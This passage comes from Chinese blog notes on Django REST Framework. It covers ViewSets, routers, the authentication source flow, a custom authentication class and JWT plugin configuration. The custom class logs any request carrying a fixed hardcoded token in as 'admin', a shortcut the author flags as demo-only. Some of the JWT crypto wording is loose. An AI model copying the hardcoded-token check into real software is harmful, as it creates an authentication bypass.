</ol>
<h3 id="源码">源码</h3>
<ul>
<li>GenericViewSet</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># viewsets.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericViewSet</span><span class="params">(ViewSetMixin, generics.GenericAPIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The GenericViewSet class does not provide any actions by default,</span></span><br><span class="line"><span class="string">    but does include the base set of generic view behavior, such as</span></span><br><span class="line"><span class="string">    the `get_object` and `get_queryset` methods.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># generics.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GenericAPIView</span><span class="params">(views.APIView)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<ul>
<li>ViewSet</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ViewSet</span><span class="params">(ViewSetMixin, views.APIView)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    The base ViewSet class does not provide any actions by default.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vies.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">APIView</span><span class="params">(View)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<h2 id="modelviewset-示例代码">ModelViewSet 示例代码</h2>
<h3 id="路由层-urls.py-4">路由层 urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v6/books/'</span>,</span><br><span class="line">         views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'list'</span>, <span class="string">'post'</span>: <span class="string">'create'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v6/books/&lt;pk&gt;/'</span>, </span><br><span class="line">        views.BookModelViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'retrieve'</span>, <span class="string">'put'</span>: <span class="string">'update'</span>, <span class="string">'patch'</span>: <span class="string">'partial_update'</span>, <span class="string">'delete'</span>: <span class="string">'destroy'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="视图层-views.py-4">视图层 views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelViewSet</span><span class="params">(ModelViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删不是数据库，而是该记录中的修改is_delete的值，因此重写默认的destroy函数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">destroy</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        instance = self.get_object()  <span class="comment"># type: models.Book</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> instance:</span><br><span class="line">            <span class="keyword">return</span> APIResponse(<span class="number">1</span>, <span class="string">'删除失败'</span>)  <span class="comment"># 实际操作，在此之前就做了判断</span></span><br><span class="line">        instance.is_delete = <span class="literal">True</span></span><br><span class="line">        instance.save()</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'删除成功'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="路由组件">路由组件</h1>
<p>因为具有局限性，所以在开发复杂接口时并不是首选。</p>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path, include</span><br><span class="line"><span class="keyword">from</span> rest_framework.routers <span class="keyword">import</span> SimpleRouter</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">router = SimpleRouter()</span><br><span class="line"><span class="comment"># 所有路由与ViewSet视图类的都可以注册，会产生 'v7/books/' 和 'v7/books/&lt;pk&gt;/'</span></span><br><span class="line">router.register(<span class="string">'v7/books'</span>, views.BookModelViewSet)</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># router.urls添加方法一</span></span><br><span class="line">    <span class="comment"># path('', include(router.urls)),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># router.urls添加方法二</span></span><br><span class="line"><span class="comment"># urlpatterns += router.urls</span></span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>一图胜千言，非原创，均来自网络：</p>
<img src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/1.png" class="" title="图1">
<img src="/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/2.jpg" class="" title="图2">
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十一）：认证组件</title>
    <url>/tech/drf-learning-notes-11-authentication/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (11): Authentication</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvYXV0aGVudGljYXRpb24ucHk=">rest_framework.authentication<i class="fa fa-external-link-alt"></i></span></li>
<li>官方文档 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24v">API Guild - Authentication<i class="fa fa-external-link-alt"></i></span></li>
<li>本文demo代码Github
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9hdXRoZW50aWNhdGlvbi8=">自定义认证类<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzExX2RyZl9qd3Qv">jwt &amp; simple-jwt<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
</ul>
<a id="more"></a>
<h1 id="源码分析">源码分析</h1>
<h2 id="入口">入口</h2>
<p>从<code>rest_framework.views.APIView</code>的<code>dispath(self, request, *args, **kwargs)</code>下手 ，<code>dispath</code>方法内 <code>self.initial(request, *args, **kwargs)</code> 进入三大认证 - 认证组件 <code>self.perform_authentication(request)</code> - 校验用户：游客、合法用户、非法用户 - 游客：代表校验通过，直接进入下一步校验（权限校验） - 合法用户：代表校验通过，将用户存储在<code>request.user</code>中，再进入下一步校验（权限校验） - 非法用户：代表校验失败，抛出异常，返回403权限异常结果 - 权限组件 <code>self.check_permissions(request)</code> - 校验用户权限：必须登录、所有用户、登录之后读写，游客只读、自定义用户角色 - 认证通过：可以进入下一步校验（频率认证） - 认证失败：抛出异常，返回403权限异常结果 - 频率组件 <code>self.check_throttles(request)</code> - 限制视图接口被访问的频率次数 - 限制的条件(IP、id、唯一键)、频率周期时间(s、m、h)、频率的次数（3/s） - 没有达到限次：正常访问接口 - 达到限次：限制时间内不能访问，限制时间达到后，可以重新访问</p>
<p>本文介绍认证组件。</p>
<h2 id="rest_framework.views.apiview.initial">rest_framework.views.APIView.initial()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Runs anything that needs to occur prior to calling the method handler.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.format_kwarg = self.get_format_suffix(**kwargs)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Perform content negotiation and store the accepted info on the request</span></span><br><span class="line">        neg = self.perform_content_negotiation(request)</span><br><span class="line">        request.accepted_renderer, request.accepted_media_type = neg</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Determine the API version, if versioning is in use.</span></span><br><span class="line">        version, scheme = self.determine_version(request, *args, **kwargs)</span><br><span class="line">        request.version, request.versioning_scheme = version, scheme</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Ensure that the incoming request is permitted</span></span><br><span class="line">        self.perform_authentication(request)  <span class="comment">#认证</span></span><br><span class="line">        self.check_permissions(request)  <span class="comment">#权限</span></span><br><span class="line">        self.check_throttles(request)  <span class="comment">#频率</span></span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.views.apiview.perform_authentication">rest_framework.views.APIView.perform_authentication()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">perform_authentication</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        Perform authentication on the incoming request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Note that if you override this and simply 'pass', then authentication</span></span><br><span class="line"><span class="string">        will instead be performed lazily, the first time either</span></span><br><span class="line"><span class="string">        `request.user` or `request.auth` is accessed.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        request.user</span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.request.request.user">rest_framework.request.Request.user</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Returns the user associated with the current request, as authenticated</span></span><br><span class="line"><span class="string">    by the authentication classes provided to the request.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">'_user'</span>):</span><br><span class="line">        <span class="keyword">with</span> wrap_attributeerrors():</span><br><span class="line">            self._authenticate()</span><br><span class="line">    <span class="keyword">return</span> self._user</span><br></pre></td></tr></table></figure>
<h2 id="rest_framework.request.request._authenticate">rest_framework.request.Request._authenticate()</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 做认证</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_authenticate</span><span class="params">(self)</span>:</span>  <span class="comment">#这里的self就是request</span></span><br><span class="line">    <span class="comment"># 遍历拿到一个个认证器，进行认证</span></span><br><span class="line">    <span class="comment"># self.authenticators配置的一堆认证类产生的认证类对象组成的 list</span></span><br><span class="line">　　　　 <span class="comment"># 即：[auth() for auth in self.authentication_classes]</span></span><br><span class="line">    <span class="keyword">for</span> authenticator <span class="keyword">in</span> self.authenticators:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 认证器(对象)调用认证方法authenticate(认证类对象self, request请求对象)</span></span><br><span class="line">            <span class="comment"># 返回值：登陆的用户与认证的信息组成的 tuple</span></span><br><span class="line">            <span class="comment"># 该方法被try包裹，代表该方法会抛异常，抛异常就代表认证失败</span></span><br><span class="line">            user_auth_tuple = authenticator.authenticate(self)</span><br><span class="line">        <span class="keyword">except</span> exceptions.APIException:</span><br><span class="line">            self._not_authenticated()</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回值的处理</span></span><br><span class="line">        <span class="keyword">if</span> user_auth_tuple <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._authenticator = authenticator</span><br><span class="line">            <span class="comment"># 如何有返回值，就将 登陆用户 与 登陆认证 分别保存到 request.user、request.auth</span></span><br><span class="line">            self.user, self.auth = user_auth_tuple</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 如果返回值user_auth_tuple为空，代表认证通过，但是没有 登陆用户 与 登陆认证信息，代表游客</span></span><br><span class="line">    self._not_authenticated()</span><br></pre></td></tr></table></figure>
<h1 id="自定义认证类">自定义认证类</h1>
<div class="note warning">
            <p>认证组件一般都是自定义的，不会使用原始的</p>
          </div>
<h2 id="方法">方法</h2>
<p>从源码的<code>settings</code>文件可以看出，认证类需要继承<code>BasicAuthentication</code>(在authentication.py文件)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEFAULT_AUTHENTICATION_CLASSES<span class="string">': [</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.SessionAuthentication<span class="string">',  #会重新开启CSRF认证</span></span><br><span class="line"><span class="string">    '</span>rest_framework.authentication.BasicAuthentication<span class="string">'</span></span><br><span class="line"><span class="string">]</span></span><br></pre></td></tr></table></figure>
<p>具体流程如下：</p>
<ol type="1">
<li>创建继承<code>BaseAuthentication</code>的认证类</li>
<li>重写<code>authenticate</code>方法</li>
<li>实现体根据认证规则 确定游客、非法用户、合法用户 （根据自己的认证规则）
<ul>
<li>没有认证信息返回<code>None</code>(游客)</li>
<li>有认证信息认证失败抛异常(非法用户)</li>
<li>有认证信息认证成功返回用户与认证信息元组(合法用户)</li>
</ul></li>
<li>进行全局或局部配置</li>
</ol>
<h2 id="示例代码">示例代码</h2>
<h3 id="models.py">models.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">from</span> django.contrib.auth.models <span class="keyword">import</span> AbstractUser</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(AbstractUser)</span>:</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>,unique=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'user'</span></span><br><span class="line">        verbose_name = <span class="string">'用户表'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.username</span><br></pre></td></tr></table></figure>
<h3 id="utils.authentications.py">utils.authentications.py</h3>
<details>
<p><summary> <b><i>Source Code</i></b> </summary></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1）继承BaseAuthentication类</span></span><br><span class="line"><span class="comment"># 2）重写authenticate(self, request)方法，自定义认证规则</span></span><br><span class="line"><span class="comment"># 3）自定义认证规则基于的条件：</span></span><br><span class="line"><span class="comment">#       没有认证信息返回None(游客)</span></span><br><span class="line"><span class="comment">#       有认证信息认证失败抛异常(非法用户)</span></span><br><span class="line"><span class="comment">#       有认证信息认证成功返回用户与认证信息元组(合法用户)</span></span><br><span class="line"><span class="comment"># 4）完全视图类的全局(settings文件中)或局部(确切的视图类)配置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> BaseAuthentication</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> AuthenticationFailed   <span class="comment">#异常接收</span></span><br><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment">#继承BaseAuthentication</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyAuthentication</span><span class="params">(BaseAuthentication)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        同前台请求头拿认证信息auth（获取认证的字段要与前台约定）</span></span><br><span class="line"><span class="string">        没有auth是游客，返回None</span></span><br><span class="line"><span class="string">        有auth进行校验</span></span><br><span class="line"><span class="string">            失败是非法用户，抛出异常</span></span><br><span class="line"><span class="string">            成功是合法用户，返回 (用户, 认证信息)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">authenticate</span><span class="params">(self, request)</span>:</span>   <span class="comment">#重写authenticate方法</span></span><br><span class="line">　　　　<span class="comment">#前台在请求头携带认证信息，</span></span><br><span class="line">　　　　<span class="comment">#且默认规范用 Authorization 字段携带认证信息，</span></span><br><span class="line">　　　　<span class="comment">#后台固定在请求对象的META字段中 HTTP_AUTHORIZATION 获取</span></span><br><span class="line">        <span class="comment">#认证信息auth</span></span><br><span class="line">        auth = request.META.get(<span class="string">'HTTP_AUTHORIZATION'</span>,<span class="literal">None</span>)<span class="comment">#处理游客</span></span><br><span class="line">        <span class="keyword">if</span> auth <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment">#设置认证字段小规则(两段式):"auth 认证字符串" 在BasicAuthentication类中有规则范式</span></span><br><span class="line">        auth_list = auth.split()     <span class="comment">#校验是否还是非法用户,不是两段，第一段不是auth就是非法用户</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (len(auth_list) == <span class="number">2</span> <span class="keyword">and</span> auth_list[<span class="number">0</span>].lower() == <span class="string">'auth'</span>):</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'认证信息有误，非法用户'</span>)  <span class="comment">#抛异常</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#校验认证信息第二段从auth_list[1]中解析出来</span></span><br><span class="line">        <span class="comment"># 注：假设一种情况，信息为abc.123.xyz，就可以解析出admin用户；实际开发，该逻辑一定是校验用户的正常逻辑</span></span><br><span class="line">        <span class="keyword">if</span> auth_list[<span class="number">1</span>] != <span class="string">'abc.123.xyz'</span>: <span class="comment">#校验失败</span></span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'信息错误，非法用户'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#最后再去数据库校验是否有此用户</span></span><br><span class="line">        user = models.User.objects.filter(username=<span class="string">'admin'</span>).first()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationFailed(<span class="string">'用户数据有误，非法用户'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (user,<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
</details>
<h3 id="settings.py">settings.py</h3>
<p>在<code>settings</code>文件中配置自定义认证组件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 认证类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="views.py">views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestAPIView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="comment"># 如果通过了认证组件，request.user就一定有值</span></span><br><span class="line">        <span class="comment"># 游客：AnonymousUser</span></span><br><span class="line">        <span class="comment"># 用户：User表中的具体用户对象</span></span><br><span class="line">        print(request.user)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(<span class="number">0</span>, <span class="string">'test get ok'</span>)</span><br></pre></td></tr></table></figure>
<h3 id="urls.py">urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'test/'</span>, views.TestAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="postman测试">Postman测试</h2>
<p>使用Postman的get请求，在自定义认证组件获取用户，在views视图通过<code>request.user</code>能打印出来</p>
<h1 id="token认证">Token认证</h1>
<h2 id="jwt">JWT</h2>
<p>RESTful API里使用最普遍的就是基于json的token认证了，即Json Web Token（JWT）。JWT 是一个开放标准(RFC 7519)，它定义了一种用于简洁，自包含的用于通信双方之间以 JSON 对象的形式安全传递信息的方法。JWT 可以使用 HMAC 算法或者是 RSA 的公钥密钥对进行签名。</p>
<h3 id="优点">优点</h3>
<ol type="1">
<li>服务器不要存储token，token交给每一个客户端自己存储，服务器压力小</li>
<li>服务器存储的是 签发和校验token 两段算法，签发认证的效率高</li>
<li>算法完成各集群服务器同步成本低，路由项目完成集群部署（适应高并发）</li>
</ol>
<h3 id="jwt格式">JWT格式</h3>
<ol type="1">
<li>jwt token采用三段式：头部.载荷.签名</li>
<li>每一部分都是一个json字典加密形参的字符串</li>
<li>头部和载荷采用的是base64可逆加密（前台后台都可以解密）</li>
<li>签名采用hash256不可逆加密（后台校验采用碰撞校验）</li>
<li>各部分字典的内容：
<ul>
<li>头部：基础信息 - 公司信息、项目组信息、可逆加密采用的算法</li>
<li>载荷：有用但非私密的信息 - 用户可公开信息、过期时间</li>
<li>签名：头部+载荷+秘钥 不可逆加密后的结果</li>
<li>注：服务器jwt签名加密秘钥一定不能泄露</li>
</ul></li>
</ol>
<h3 id="签发与校验">签发与校验</h3>
<ul>
<li>签发token：固定的头部信息加密。当前的登陆用户与过期时间加密。头部+载荷+秘钥生成不可逆加密</li>
<li>校验token：头部可校验也可以不校验，载荷校验出用户与过期时间，头部+载荷+秘钥完成碰撞检测校验token是否被篡改</li>
</ul>
<h2 id="drf自带的jwt认证">DRF自带的JWT认证</h2>
<p>DRF的源码里是实现了token认证模块了的，不过存在<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81ZDIzZjQzZGYyNjVkYTFiY2MxOTY3NDkjaGVhZGluZy03">一些不足<i class="fa fa-external-link-alt"></i></span>，因此一般不推荐使用。</p>
<p>一般使用的是DRF的两个jwt插件：</p>
<ul>
<li><code>jango-rest-framework-jwt</code>: 曾经很常用，但后来作者已不再维护，因此也不推荐使用</li>
<li><code>django-rest-framework-simplejwt</code>: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvYXV0aGVudGljYXRpb24vI2pzb24td2ViLXRva2VuLWF1dGhlbnRpY2F0aW9u">DRF官方文档<i class="fa fa-external-link-alt"></i></span>推荐使用的插件</li>
</ul>
<h2 id="drf插件-django-rest-framework-jwt">DRF插件 django-rest-framework-jwt</h2>
<p>示例代码如下</p>
<h3 id="settings.py-1">settings.py</h3>
<div class="note warning">
            <p>此处设置的是全局配置</p>
          </div>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 认证类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_jwt.authentication.JSONWebTokenAuthentication'</span>, <span class="comment"># jwt全局配置</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="models.py-1">models.py</h3>
<p>代码同上</p>
<h3 id="views.py-1">views.py</h3>
<div class="note warning">
            <p>此处设置的是局部配置</p>
          </div>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> utils.response <span class="keyword">import</span> APIResponse</span><br><span class="line"><span class="comment"># 必须登录后才能访问 - 通过了认证权限组件</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated</span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.authentication <span class="keyword">import</span> JSONWebTokenAuthentication</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserDetail</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    authentication_classes = [JSONWebTokenAuthentication]  <span class="comment"># 局部配置jwt-token校验request.user</span></span><br><span class="line">    permission_classes = [IsAuthenticated]  <span class="comment"># 结合权限组件筛选掉游客</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=&#123;<span class="string">'username'</span>: request.user.username&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="url.py">url.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ObtainJSONWebToken视图类就是通过username和password得到user对象然后签发token（生成token）</span></span><br><span class="line"><span class="keyword">from</span> rest_framework_jwt.views <span class="keyword">import</span> ObtainJSONWebToken, obtain_jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'jwt/'</span>, obtain_jwt_token),</span><br><span class="line">    path(<span class="string">'user/detail/'</span>, views.UserDetail.as_view()),</span><br></pre></td></tr></table></figure>
<h2 id="drf插件-django-rest-framework-simplejwt">DRF插件 django-rest-framework-simplejwt</h2>
<p>示例代码如下</p>
<h3 id="settings.py-2">settings.py</h3>
<div class="note warning">
            <p>此处设置的是全局配置</p>
          </div>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">REST_FRAMEWORK = &#123;</span><br><span class="line">    <span class="comment"># 认证类配置</span></span><br><span class="line">    <span class="string">'DEFAULT_AUTHENTICATION_CLASSES'</span>: [</span><br><span class="line">        <span class="string">'utils.authentications.MyAuthentication'</span>,</span><br><span class="line">        <span class="string">'rest_framework_simplejwt.authentication.JWTAuthentication'</span>, <span class="comment"># 全局配置</span></span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此外，还有simplejwt的一些细节配置：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reference :</span></span><br><span class="line"><span class="comment"># 1. https://django-rest-framework-simplejwt.readthedocs.io/en/latest/settings.html</span></span><br><span class="line"><span class="comment"># 2. https://juejin.im/post/5d23f43df265da1bcc196749#heading-15</span></span><br><span class="line">SIMPLE_JWT = &#123;</span><br><span class="line">    <span class="string">'ACCESS_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'REFRESH_TOKEN_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">    <span class="string">'ROTATE_REFRESH_TOKENS'</span>: <span class="literal">False</span>,</span><br><span class="line">    <span class="string">'BLACKLIST_AFTER_ROTATION'</span>: <span class="literal">True</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'ALGORITHM'</span>: <span class="string">'HS256'</span>,</span><br><span class="line">    <span class="string">'SIGNING_KEY'</span>: SECRET_KEY,</span><br><span class="line">    <span class="string">'VERIFYING_KEY'</span>: <span class="literal">None</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_HEADER_TYPES'</span>: (<span class="string">'Bearer'</span>,),</span><br><span class="line">    <span class="string">'USER_ID_FIELD'</span>: <span class="string">'id'</span>,</span><br><span class="line">    <span class="string">'USER_ID_CLAIM'</span>: <span class="string">'user_id'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'AUTH_TOKEN_CLASSES'</span>: (<span class="string">'rest_framework_simplejwt.tokens.AccessToken'</span>,),</span><br><span class="line">    <span class="string">'TOKEN_TYPE_CLAIM'</span>: <span class="string">'token_type'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'JTI_CLAIM'</span>: <span class="string">'jti'</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_EXP_CLAIM'</span>: <span class="string">'refresh_exp'</span>,</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_LIFETIME'</span>: timedelta(minutes=<span class="number">5</span>),</span><br><span class="line">    <span class="string">'SLIDING_TOKEN_REFRESH_LIFETIME'</span>: timedelta(days=<span class="number">1</span>),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="models.py-2">models.py</h3>
<p>代码同上</p>
<h3 id="views.py-2">views.py</h3>
<div class="note warning">
            <p>此处设置的是局部配置</p>
          </div>
